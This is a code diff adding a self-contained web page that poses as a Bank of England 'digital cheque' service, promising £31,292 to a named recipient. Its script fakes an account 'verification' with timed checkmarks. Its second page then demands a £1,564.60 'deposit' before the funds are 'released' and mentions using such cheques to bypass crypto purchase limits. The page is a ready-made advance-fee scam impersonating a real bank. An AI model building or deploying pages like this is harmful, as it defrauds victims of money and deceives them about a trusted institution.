@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Bank of England | Digital Cheque</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #e8d9ca;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Main card - perfectly responsive */
+        .card {
+            max-width: 880px;
+            width: 100%;
+            background: #fffcf7;
+            border-radius: 2.5rem;
+            box-shadow: 0 40px 70px -20px rgba(30, 20, 10, 0.25);
+            border: 1px solid rgba(210, 180, 150, 0.3);
+            overflow: hidden;
+        }
+
+        .card-inner {
+            padding: 2rem 2rem 2.5rem;
+        }
+
+        @media (max-width: 600px) {
+            .card-inner {
+                padding: 1.5rem 1.25rem;
+            }
+            body {
+                padding: 0.75rem;
+            }
+        }
+
+        /* Pages */
+        .page { display: block; }
+        .page.hidden { display: none; }
+
+        /* Header with logo - BIGGER LOGO NOW */
+        .header-row {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        @media (min-width: 640px) {
+            .header-row {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: flex-end;
+            }
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        /* BIGGER LOGO STYLES */
+        .boe-logo {
+            height: 70px;  /* INCREASED FROM 40px TO 70px */
+            width: auto;
+            object-fit: contain;
+        }
+
+        @media (max-width: 480px) {
+            .boe-logo {
+                height: 50px;  /* BIGGER ON MOBILE TOO (was 32px) */
+            }
+        }
+
+        .title-small {
+            font-size: 0.8rem;  /* SLIGHTLY BIGGER */
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: #b29479;
+            font-weight: 500;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 500;
+            line-height: 1.2;
+            color: #1e1a16;
+            letter-spacing: -0.02em;
+            margin: 0.5rem 0 1rem;
+            max-width: 600px;
+        }
+
+        @media (min-width: 768px) {
+            h1 {
+                font-size: 2.4rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.6rem;
+            }
+        }
+
+        .description {
+            font-size: 0.9rem;
+            color: #5f554b;
+            max-width: 580px;
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+        }
+
+        /* Amount card - responsive */
+        .amount-card {
+            background: #f2eae2;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            border: 1px solid #e2d4c6;
+            width: 100%;
+        }
+
+        @media (min-width: 640px) {
+            .amount-card {
+                max-width: 280px;
+                padding: 1.5rem 1.8rem;
+            }
+        }
+
+        .amount-label {
+            font-size: 0.65rem;
+            letter-spacing: 0.15em;
+            color: #b29479;
+            text-transform: uppercase;
+            margin-bottom: 0.25rem;
+        }
+
+        .amount-number {
+            font-size: 2.8rem;
+            font-weight: 500;
+            color: #1e1a16;
+            line-height: 1;
+            margin-bottom: 0.75rem;
+        }
+
+        .amount-number small {
+            font-size: 1.2rem;
+            color: #b29479;
+            margin-left: 0.2rem;
+        }
+
+        @media (max-width: 480px) {
+            .amount-number {
+                font-size: 2.2rem;
+            }
+        }
+
+        .payment-badge {
+            background: #e2d4c6;
+            border-radius: 40px;
+            padding: 0.4rem 1.2rem;
+            display: inline-block;
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #3d3229;
+            margin: 0.5rem 0;
+        }
+
+        .earmark {
+            font-size: 0.75rem;
+            color: #7a6c5e;
+            border-top: 1px solid #e2d4c6;
+            padding-top: 0.75rem;
+        }
+
+        /* Progress steps - FIXED for mobile */
+        .progress-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 2rem 0 1.5rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px solid #f0e5dc;
+        }
+
+        @media (min-width: 500px) {
+            .progress-steps {
+                flex-direction: row;
+                justify-content: space-between;
+            }
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .step-marker {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #e2d4c6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #4d4033;
+            flex-shrink: 0;
+        }
+
+        .step-item.completed .step-marker {
+            background: #c7b09b;
+            color: white;
+        }
+
+        .step-item.active .step-marker {
+            background: #dac1ab;
+            color: #2b241e;
+            box-shadow: 0 0 0 3px #f0e2d6;
+        }
+
+        .step-text {
+            font-size: 0.9rem;
+            font-weight: 450;
+            color: #4d4033;
+        }
+
+        .step-text span {
+            display: block;
+            font-size: 0.7rem;
+            color: #8f7e6b;
+            font-weight: 350;
+        }
+
+        /* Step label */
+        .step-label {
+            font-size: 0.7rem;
+            letter-spacing: 0.2em;
+            color: #b29479;
+            margin-bottom: 1.25rem;
+        }
+
+        /* Main grid - FIXED for mobile */
+        .grid-container {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+
+        @media (min-width: 700px) {
+            .grid-container {
+                flex-direction: row;
+            }
+            .grid-left {
+                flex: 1.4;
+            }
+            .grid-right {
+                flex: 1;
+            }
+        }
+
+        /* Form fields */
+        .field-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #b29479;
+            margin-bottom: 0.25rem;
+            font-weight: 500;
+            padding-left: 0.5rem;
+        }
+
+        .field-box {
+            background: #fffcf7;
+            border: 1.5px solid #e8d9ca;
+            border-radius: 40px;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            width: 100%;
+            outline: none;
+            transition: all 0.2s;
+            color: #1e1a16;
+        }
+
+        .field-box:focus {
+            border-color: #c7ad93;
+            box-shadow: 0 0 0 3px #f0e2d6;
+        }
+
+        /* Custom select - PREMIUM */
+        .custom-select {
+            position: relative;
+            width: 100%;
+        }
+
+        .select-trigger {
+            background: #fffcf7;
+            border: 1.5px solid #e8d9ca;
+            border-radius: 40px;
+            padding: 0.75rem 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            min-height: 3.5rem;
+        }
+
+        .selected-value {
+            font-size: 1rem;
+            color: #1e1a16;
+        }
+
+        .selected-value span {
+            color: #b29479;
+            margin-right: 0.5rem;
+        }
+
+        .chevron {
+            color: #b29479;
+            font-size: 1.2rem;
+            transition: transform 0.3s;
+        }
+
+        .chevron.open {
+            transform: rotate(180deg);
+        }
+
+        .select-dropdown {
+            position: absolute;
+            top: calc(100% + 0.5rem);
+            left: 0;
+            right: 0;
+            background: #fffcf7;
+            border: 1.5px solid #e8d9ca;
+            border-radius: 1.5rem;
+            padding: 0.75rem 0.5rem;
+            box-shadow: 0 20px 30px -15px rgba(0,0,0,0.2);
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-5px);
+            transition: all 0.2s;
+        }
+
+        .select-dropdown.open {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .search-box {
+            margin: 0.25rem 0.75rem 0.75rem;
+            padding: 0.5rem 1rem;
+            background: #f2eae2;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .search-box input {
+            border: none;
+            background: transparent;
+            width: 100%;
+            outline: none;
+            font-size: 0.9rem;
+        }
+
+        .bank-option {
+            padding: 0.75rem 1.25rem;
+            margin: 0.15rem 0;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.95rem;
+        }
+
+        .bank-option:hover {
+            background: #f2eae2;
+        }
+
+        .bank-option.selected {
+            background: #e2d4c6;
+            font-weight: 500;
+        }
+
+        .bank-option.selected::after {
+            content: '✓';
+            float: right;
+            color: #b29479;
+        }
+
+        /* Verified badge */
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.3rem 1rem;
+            background: #e4efe4;
+            border-radius: 40px;
+            color: #2c6b4a;
+            font-size: 0.7rem;
+            font-weight: 500;
+            margin-top: 0.3rem;
+            margin-left: 1rem;
+        }
+
+        /* Verification gallery - FIXED for mobile */
+        .gallery {
+            margin: 1.5rem 0 1rem;
+            border-top: 2px solid #f0e5dc;
+            padding-top: 1.5rem;
+        }
+
+        .gallery-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            cursor: pointer;
+        }
+
+        .gallery-header h4 {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #4d4033;
+        }
+
+        .gallery-items {
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+        }
+
+        .gallery-items.expanded {
+            max-height: 400px;
+        }
+
+        .gallery-row {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            background: #f8f2ec;
+            border-radius: 40px;
+            padding: 0.7rem 1.2rem;
+            border: 1px solid #e8d9ca;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 450px) {
+            .gallery-row {
+                gap: 0.5rem;
+            }
+        }
+
+        .status-dot {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #dbd3cb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 0.8rem;
+            flex-shrink: 0;
+        }
+
+        .status-dot.lit {
+            background: #8faa8a;
+            box-shadow: 0 0 0 2px #e2f0dc;
+        }
+
+        .row-label {
+            font-size: 0.85rem;
+            color: #5f554b;
+            min-width: 100px;
+        }
+
+        @media (max-width: 400px) {
+            .row-label {
+                min-width: 80px;
+                font-size: 0.8rem;
+            }
+        }
+
+        .row-value {
+            font-weight: 550;
+            color: #1e1a16;
+            background: #fffcf7;
+            padding: 0.2rem 1rem;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            border: 1px solid #e8d9ca;
+            word-break: break-word;
+        }
+
+        /* Buttons */
+        .button-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.75rem;
+            margin: 1.5rem 0 0.5rem;
+        }
+
+        .btn {
+            padding: 0.8rem 2rem;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            transition: all 0.2s;
+            flex: 1 1 auto;
+        }
+
+        .btn-primary {
+            background: #dac1ab;
+            color: #1e1a16;
+            border: 1px solid #c0a388;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .btn-outline {
+            border: 1.5px solid #dac1ab;
+            color: #5f554b;
+        }
+
+        /* Summary panel - responsive */
+        .summary-panel {
+            background: #f2eae2;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            border: 1px solid #e2d4c6;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid #e2d4c6;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .summary-label {
+            color: #7a6c5e;
+            font-size: 0.9rem;
+        }
+
+        .summary-value {
+            font-weight: 550;
+            color: #1e1a16;
+            background: #fffcf7;
+            padding: 0.2rem 1.2rem;
+            border-radius: 40px;
+            font-size: 0.9rem;
+        }
+
+        .note {
+            font-size: 0.7rem;
+            color: #b29479;
+            margin-top: 1rem;
+        }
+
+        /* Release page - responsive */
+        .release-card {
+            background: #f2eae2;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .required-block {
+            background: #e2d4c6;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+
+        .required-number {
+            font-size: 2.5rem;
+            font-weight: 500;
+            color: #1e1a16;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+            background: #faf5ef;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        @media (min-width: 500px) {
+            .info-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .info-cell {
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+
+        .info-label {
+            font-size: 0.6rem;
+            letter-spacing: 0.1em;
+            color: #b29479;
+            text-transform: uppercase;
+        }
+
+        .info-value {
+            font-size: 1rem;
+            font-weight: 520;
+            color: #1e1a16;
+            background: #fffcf7;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            display: inline-block;
+            width: fit-content;
+            border: 1px solid #e2d4c6;
+        }
+
+        .mt-2 { margin-top: 1rem; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-inner">
+            <!-- PAGE 1 -->
+            <div id="page1" class="page">
+                <!-- Header with LARGE Bank of England logo -->
+                <div class="header-row">
+                    <div>
+                        <div class="logo-area">
+                            <!-- MUCH BIGGER LOGO - 70px height -->
+                            <img class="boe-logo" src="logob.png" alt="Bank of England">
+                            <span class="title-small">DIGITAL CHEQUE DEPOSIT</span>
+                        </div>
+                        <h1>Easy Payment and Finance cheque to Jadallah Bashour</h1>
+                        <p class="description">Seamlessly confirm the receiving account, run built-in security checks, and monitor the final release of funds. Everything happens in a guided flow so you know exactly what comes next.</p>
+                    </div>
+                    <div class="amount-card">
+                        <div class="amount-label">INCOMING AMOUNT</div>
+                        <div class="amount-number">£31,292<small>.00</small></div>
+                        <span class="payment-badge">Payment & Finance</span>
+                        <div class="earmark">Funds earmarked for release once the receiving credentials are validated.</div>
+                    </div>
+                </div>
+
+                <!-- Progress steps -->
+                <div class="progress-steps">
+                    <div class="step-item completed">
+                        <div class="step-marker">✓</div>
+                        <div class="step-text">Cheque overview <span>high-level</span></div>
+                    </div>
+                    <div class="step-item active">
+                        <div class="step-marker">2</div>
+                        <div class="step-text">Verify recipient <span>destination</span></div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-marker">3</div>
+                        <div class="step-text">Deposit status <span>safeguards</span></div>
+                    </div>
+                </div>
+
+                <!-- Step 2 of 3 -->
+                <div class="step-label">Step 2 of 3</div>
+
+                <!-- Main grid -->
+                <div class="grid-container">
+                    <div class="grid-left">
+                        <!-- Receiving bank - custom select -->
+                        <div class="field-group">
+                            <div class="field-label">RECEIVING BANK</div>
+                            <div class="custom-select" id="customSelect">
+                                <div class="select-trigger" id="selectTrigger">
+                                    <div class="selected-value">
+                                        <span>Selected:</span> <span id="selectedBankText">Lloyds</span>
+                                    </div>
+                                    <div class="chevron" id="chevron">⌄</div>
+                                </div>
+                                <div class="select-dropdown" id="selectDropdown">
+                                    <div class="search-box">
+                                        <span>🔍</span>
+                                        <input type="text" id="bankSearch" placeholder="Search banks...">
+                                    </div>
+                                    <div class="bank-list" id="bankList">
+                                        <div class="bank-option selected" data-value="Lloyds">Lloyds</div>
+                                        <div class="bank-option" data-value="Nationwide">Nationwide</div>
+                                        <div class="bank-option" data-value="Barclays">Barclays</div>
+                                        <div class="bank-option" data-value="HSBC">HSBC</div>
+                                        <div class="bank-option" data-value="NatWest">NatWest</div>
+                                        <div class="bank-option" data-value="Santander">Santander</div>
+                                        <div class="bank-option" data-value="Bank of Scotland">Bank of Scotland</div>
+                                        <div class="bank-option" data-value="Revolut">Revolut</div>
+                                        <div class="bank-option" data-value="Monzo">Monzo</div>
+                                        <div class="bank-option" data-value="XE">XE</div>
+                                        <div class="bank-option" data-value="Starling">Starling</div>
+                                        <div class="bank-option" data-value="Wise">Wise</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Account holder name -->
+                        <div class="field-group">
+                            <div class="field-label">ACCOUNT HOLDER NAME</div>
+                            <input class="field-box" type="text" id="holderName" value="334244">
+                        </div>
+
+                        <!-- SWIFT / Sort code -->
+                        <div class="field-group">
+                            <div class="field-label">SWIFT / SORT CODE</div>
+                            <input class="field-box" type="text" id="sortCode" value="43-42-34">
+                        </div>
+
+                        <!-- Account number -->
+                        <div class="field-group">
+                            <div class="field-label">ACCOUNT NUMBER</div>
+                            <input class="field-box" type="text" id="accountNumber" value="42432432">
+                            <span class="verified-badge">✓ Account number verified</span>
+                        </div>
+
+                        <!-- Verification gallery -->
+                        <div class="gallery">
+                            <div class="gallery-header" id="galleryHeader">
+                                <h4>Verification status</h4>
+                                <span class="gallery-arrow" id="galleryArrow">⌄</span>
+                            </div>
+                            <div class="gallery-items expanded" id="galleryItems">
+                                <div class="gallery-row">
+                                    <span class="status-dot" id="iconBank">○</span>
+                                    <span class="row-label">Receiving bank</span>
+                                    <span class="row-value" id="gBankVal">Lloyds</span>
+                                </div>
+                                <div class="gallery-row">
+                                    <span class="status-dot" id="iconHolder">○</span>
+                                    <span class="row-label">Account holder</span>
+                                    <span class="row-value" id="gHolderVal">334244</span>
+                                </div>
+                                <div class="gallery-row">
+                                    <span class="status-dot" id="iconSort">○</span>
+                                    <span class="row-label">SWIFT/Sort</span>
+                                    <span class="row-value" id="gSortVal">43-42-34</span>
+                                </div>
+                                <div class="gallery-row">
+                                    <span class="status-dot" id="iconAcc">○</span>
+                                    <span class="row-label">Account number</span>
+                                    <span class="row-value" id="gAccVal">42432432</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Buttons -->
+                        <div class="button-group">
+                            <button class="btn btn-outline" id="cancelBtn">Cancel</button>
+                            <button class="btn btn-primary" id="verifyBtn">Verify now</button>
+                            <button class="btn btn-primary" id="confirmBtn" disabled>Confirm transfer</button>
+                        </div>
+                    </div>
+
+                    <!-- Right panel - Summary -->
+                    <div class="grid-right">
+                        <div class="summary-panel">
+                            <h3 style="font-size: 1.1rem; margin-bottom: 1rem;">Recipient summary</h3>
+                            <div class="summary-row">
+                                <span class="summary-label">Bank</span>
+                                <span class="summary-value" id="sumBank">Lloyds</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="summary-label">Holder</span>
+                                <span class="summary-value" id="sumHolder">334244</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="summary-label">Sort code</span>
+                                <span class="summary-value" id="sumSort">43-42-34</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="summary-label">Account</span>
+                                <span class="summary-value" id="sumAcc">42432432</span>
+                            </div>
+                            <div class="note">We use automated reconciliation to confirm your details match with the issuing bank.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 2 - RELEASE (hidden initially) -->
+            <div id="page2" class="page hidden">
+                <div class="header-row" style="margin-bottom: 1rem;">
+                    <div>
+                        <div class="logo-area">
+                            <!-- MUCH BIGGER LOGO ON PAGE 2 TOO -->
+                            <img class="boe-logo" src="logob.png" alt="Bank of England">
+                            <span class="title-small">DIGITAL CHEQUE DEPOSIT</span>
+                        </div>
+                        <h2 style="font-size: 1.8rem; margin: 0.5rem 0;">Release progress</h2>
+                    </div>
+                    <div class="amount-card" style="padding: 1rem 1.5rem;">
+                        <div class="amount-number" style="font-size: 1.8rem;">£31,292</div>
+                    </div>
+                </div>
+
+                <div class="progress-steps">
+                    <div class="step-item completed"><div class="step-marker">✓</div><div class="step-text">Overview</div></div>
+                    <div class="step-item completed"><div class="step-marker">✓</div><div class="step-text">Recipient</div></div>
+                    <div class="step-item active"><div class="step-marker">3</div><div class="step-text">Deposit</div></div>
+                </div>
+
+                <span class="step-label">STEP 3 OF 3</span>
+
+                <div class="release-card">
+                    <div style="font-size: 1.5rem; font-weight: 450; margin-bottom: 0.5rem;">Transfer paused — action required</div>
+                    <p class="description" style="margin-bottom: 1rem;">The transfer is almost complete. Provide the required deposit to unlock funds and finalize the release to the recipient bank.</p>
+
+                    <div class="required-block">
+                        <div class="amount-label">DEPOSIT STATUS</div>
+                        <div class="required-number">£1,564.60</div>
+                        <p style="font-size: 0.85rem; color: #5f554b;">Bank deposit delayed because client deposit is required to trigger the release of funds.</p>
+                    </div>
+
+                    <div style="background: #f8f2ec; border-radius: 1.5rem; padding: 1.25rem; margin: 1rem 0;">
+                        <p style="font-size: 0.85rem; margin-bottom: 0.75rem;"><strong>Security and Fraud Prevention:</strong> Online cheque transfers can offer additional layers of security and fraud prevention. Banks often have rigorous security measures that protect against unauthorized transactions and ensure the legitimacy of large transfers.</p>
+                        <p style="font-size: 0.85rem;"><strong>Transactional Limits:</strong> Transactional Limits: Some exchanges or financial institutions may have limits on direct crypto purchases. Transferring funds via an online cheque might be a necessary step to bypass these limits or to enable the purchase of larger amounts of cryptocurrency.</p>
+                    </div>
+
+                    <div style="margin: 1.5rem 0 0.5rem;">
+                        <div style="font-size: 1.1rem; font-weight: 500; margin-bottom: 0.5rem;">Release progress</div>
+                        <p class="description" style="margin-bottom: 1rem;">Deposit confirmation is the final checkpoint before funds arrive.</p>
+
+                        <div class="info-grid">
+                            <div class="info-cell"><span class="info-label">RECEIVING BANK</span><span class="info-value" id="relBank">Lloyds</span></div>
+                            <div class="info-cell"><span class="info-label">SWIFT/SORT</span><span class="info-value" id="relSort">43-42-34</span></div>
+                            <div class="info-cell"><span class="info-label">ACCOUNT NUMBER</span><span class="info-value" id="relAcc">42432432</span></div>
+                            <div class="info-cell"><span class="info-label">TRANSFER AMOUNT</span><span class="info-value">£31,292.00</span></div>
+                            <div class="info-cell"><span class="info-label">REFERENCE</span><span class="info-value">#Bashour-DEPOSIT</span></div>
+                            <div class="info-cell"><span class="info-label">SECURITY</span><span class="info-value">Fraud watch active</span></div>
+                        </div>
+
+                        <div style="background: #f2eae2; border-radius: 1.5rem; padding: 1.25rem; font-size: 0.85rem;">
+                            <strong>Security & Fraud Prevention:</strong> Online cheque transfers include multi-factor verification and biometric confirmation to guard against unauthorized releases. Larger deposits may be subject to additional high-value screening.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-2">
+                    <button class="btn btn-outline" id="backBtn">← Return</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            
+            // Custom select
+            const trigger = document.getElementById('selectTrigger');
+            const dropdown = document.getElementById('selectDropdown');
+            const chevron = document.getElementById('chevron');
+            const selectedBankText = document.getElementById('selectedBankText');
+            const bankOptions = document.querySelectorAll('.bank-option');
+            const bankSearch = document.getElementById('bankSearch');
+            
+            // Inputs
+            const holderName = document.getElementById('holderName');
+            const sortCode = document.getElementById('sortCode');
+            const accountNumber = document.getElementById('accountNumber');
+            
+            // Summary elements
+            const sumBank = document.getElementById('sumBank');
+            const sumHolder = document.getElementById('sumHolder');
+            const sumSort = document.getElementById('sumSort');
+            const sumAcc = document.getElementById('sumAcc');
+            
+            // Gallery values
+            const gBankVal = document.getElementById('gBankVal');
+            const gHolderVal = document.getElementById('gHolderVal');
+            const gSortVal = document.getElementById('gSortVal');
+            const gAccVal = document.getElementById('gAccVal');
+            
+            // Release values
+            const relBank = document.getElementById('relBank');
+            const relSort = document.getElementById('relSort');
+            const relAcc = document.getElementById('relAcc');
+            
+            // Icons
+            const iconBank = document.getElementById('iconBank');
+            const iconHolder = document.getElementById('iconHolder');
+            const iconSort = document.getElementById('iconSort');
+            const iconAcc = document.getElementById('iconAcc');
+            
+            // Buttons
+            const verifyBtn = document.getElementById('verifyBtn');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const backBtn = document.getElementById('backBtn');
+            
+            // Gallery
+            const galleryHeader = document.getElementById('galleryHeader');
+            const galleryItems = document.getElementById('galleryItems');
+            const galleryArrow = document.getElementById('galleryArrow');
+
+            // Toggle dropdown
+            trigger.addEventListener('click', (e) => {
+                e.stopPropagation();
+                dropdown.classList.toggle('open');
+                trigger.classList.toggle('open');
+                chevron.classList.toggle('open');
+            });
+
+            // Select bank
+            bankOptions.forEach(option => {
+                option.addEventListener('click', () => {
+                    const value = option.getAttribute('data-value');
+                    selectedBankText.textContent = value;
+                    bankOptions.forEach(opt => opt.classList.remove('selected'));
+                    option.classList.add('selected');
+                    dropdown.classList.remove('open');
+                    trigger.classList.remove('open');
+                    chevron.classList.remove('open');
+                    updateAll();
+                });
+            });
+
+            // Search
+            bankSearch.addEventListener('input', (e) => {
+                const term = e.target.value.toLowerCase();
+                bankOptions.forEach(opt => {
+                    opt.style.display = opt.textContent.toLowerCase().includes(term) ? 'flex' : 'none';
+                });
+            });
+
+            // Close dropdown when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!trigger.contains(e.target) && !dropdown.contains(e.target)) {
+                    dropdown.classList.remove('open');
+                    trigger.classList.remove('open');
+                    chevron.classList.remove('open');
+                }
+            });
+
+            // Gallery toggle
+            galleryHeader.addEventListener('click', () => {
+                if (galleryItems.classList.contains('expanded')) {
+                    galleryItems.classList.remove('expanded');
+                    galleryArrow.style.transform = 'rotate(0deg)';
+                } else {
+                    galleryItems.classList.add('expanded');
+                    galleryArrow.style.transform = 'rotate(180deg)';
+                }
+            });
+
+            // Update all values
+            function updateAll() {
+                const bank = selectedBankText.textContent;
+                const holder = holderName.value || '—';
+                const sort = sortCode.value || '—';
+                const acc = accountNumber.value || '—';
+
+                sumBank.textContent = bank;
+                sumHolder.textContent = holder;
+                sumSort.textContent = sort;
+                sumAcc.textContent = acc;
+
+                gBankVal.textContent = bank;
+                gHolderVal.textContent = holder;
+                gSortVal.textContent = sort;
+                gAccVal.textContent = acc;
+
+                if (relBank) relBank.textContent = bank;
+                if (relSort) relSort.textContent = sort;
+                if (relAcc) relAcc.textContent = acc;
+            }
+
+            holderName.addEventListener('input', updateAll);
+            sortCode.addEventListener('input', updateAll);
+            accountNumber.addEventListener('input', updateAll);
+            
+            // Reset icons
+            function resetIcons() {
+                [iconBank, iconHolder, iconSort, iconAcc].forEach(ic => {
+                    ic.className = 'status-dot';
+                    ic.textContent = '○';
+                });
+                confirmBtn.disabled = true;
+            }
+            resetIcons();
+
+            // Verification sequence
+            let timers = [];
+            verifyBtn.addEventListener('click', () => {
+                timers.forEach(t => clearTimeout(t));
+                resetIcons();
+                
+                if (!galleryItems.classList.contains('expanded')) {
+                    galleryItems.classList.add('expanded');
+                    galleryArrow.style.transform = 'rotate(180deg)';
+                }
+
+                timers.push(setTimeout(() => {
+                    iconBank.className = 'status-dot lit';
+                    iconBank.textContent = '✓';
+                }, 3000));
+
+                timers.push(setTimeout(() => {
+                    iconHolder.className = 'status-dot lit';
+                    iconHolder.textContent = '✓';
+                }, 6000));
+
+                timers.push(setTimeout(() => {
+                    iconSort.className = 'status-dot lit';
+                    iconSort.textContent = '✓';
+                }, 9000));
+
+                timers.push(setTimeout(() => {
+                    iconAcc.className = 'status-dot lit';
+                    iconAcc.textContent = '✓';
+                    confirmBtn.disabled = false;
+                }, 12000));
+            });
+
+            cancelBtn.addEventListener('click', () => {
+                timers.forEach(t => clearTimeout(t));
+                resetIcons();
+            });
+
+            confirmBtn.addEventListener('click', () => {
+                if (!confirmBtn.disabled) {
+                    page1.classList.add('hidden');
+                    page2.classList.remove('hidden');
+                }
+            });
+
+            backBtn.addEventListener('click', () => {
+                page2.classList.add('hidden');
+                page1.classList.remove('hidden');
+            });
+
+            updateAll();
+        })();
+    </script>
+</body>
+</html>
